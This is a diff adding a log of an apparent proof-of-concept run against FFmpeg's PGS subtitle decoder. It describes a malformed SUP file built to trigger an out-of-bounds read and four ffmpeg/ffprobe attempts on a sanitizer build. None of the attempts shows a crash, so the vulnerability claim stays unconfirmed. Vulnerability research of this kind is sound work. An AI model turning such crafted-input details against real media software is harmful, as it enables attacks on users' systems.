@@ -1,0 +1,91 @@
+=== VULN 001 PoC: CWE-125 OOB Read in parse_presentation_segment() ===
+=== File: libavcodec/pgssubdec.c lines 449-468 ===
+
+[*] Generating malformed PGS SUP file...
+[+] Written 225 bytes to /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_pgssubdec_c/vuln_001.sup
+[+] 5 PCS+END pairs; each PCS: segment_length=19, composition_flag=0x80
+[+] After reading 8-byte object fields, buf == buf_end (per PCS)
+[+] Crop read (8 bytes) goes past buf_end -> OOB read
+
+[*] SUP file: /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_pgssubdec_c/vuln_001.sup (225 bytes)
+
+[*] Method 1: overlay_graphicsub filter to force PGS decoding...
+[*] Command: /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -f lavfi -i color=black:size=1920x1080:rate=1 -i SUP ...
+
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 11 (Ubuntu 11.4.0-1ubuntu1~22.04.2)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[AVFilterGraph @ 0x510000000040] No such filter: 'overlay_graphicsub'
+Error : Filter not found
+
+[*] ffmpeg exit code (method 1): 8
+
+[*] Method 2: ffprobe -show_frames to force subtitle decoding...
+[pgssub @ 0x519000001480] Invalid palette id 0
+[*] ffprobe exit code: 0
+
+[*] Method 3: Bitmap-to-bitmap transcode PGS->dvbsub (forces decode)...
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 11 (Ubuntu 11.4.0-1ubuntu1~22.04.2)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Input #0, lavfi, from 'color=black:size=1920x1080:rate=1:duration=5':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0: Video: wrapped_avframe, yuv420p, 1920x1080 [SAR 1:1 DAR 16:9], 1 fps, 1 tbr, 1 tbn
+Input #1, sup, from '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_pgssubdec_c/vuln_001.sup':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #1:0: Subtitle: hdmv_pgs_subtitle (pgssub), 1920x1080
+[vost#0:0 @ 0x517000000e80] Unknown encoder 'libx264'
+[vost#0:0 @ 0x517000000e80] Error selecting an encoder
+Error opening output file /tmp/vuln_001_out.ts.
+Error opening output files: Encoder not found
+[*] ffmpeg exit code (method 3): 8
+
+[*] Method 4: Transcode PGS subtitles directly...
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 11 (Ubuntu 11.4.0-1ubuntu1~22.04.2)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+Input #0, sup, from '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_pgssubdec_c/vuln_001.sup':
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0: Subtitle: hdmv_pgs_subtitle (pgssub), 1920x1080
+Stream mapping:
+  Stream #0:0 -> #0:0 (hdmv_pgs_subtitle (pgssub) -> dvb_subtitle (dvbsub))
+Output #0, mpegts, to '/tmp/vuln_001_out2.ts':
+  Metadata:
+    encoder         : Lavf63.6.100
+Press [q] to stop, [?] for help
+  Stream #0:0: Subtitle: dvb_subtitle, 1920x1080
+    Metadata:
+      encoder         : Lavc63.11.100 dvbsub
+[pgssub @ 0x519000001e80] Invalid palette id 0
+    Last message repeated 4 times
+[out#0/mpegts @ 0x511000000900] video:0KiB audio:0KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: unknown
+[out#0/mpegts @ 0x511000000900] Output file is empty, nothing was encoded(check -ss / -t / -frames parameters if used)
+size=       0KiB time=N/A bitrate=N/A speed=N/A elapsed=0:00:00.00    
+[*] ffmpeg exit code (method 4): 0
+
+=== END ===
+
+[*] ffmpeg exit code: 
+=== END ===
+EXIT=0
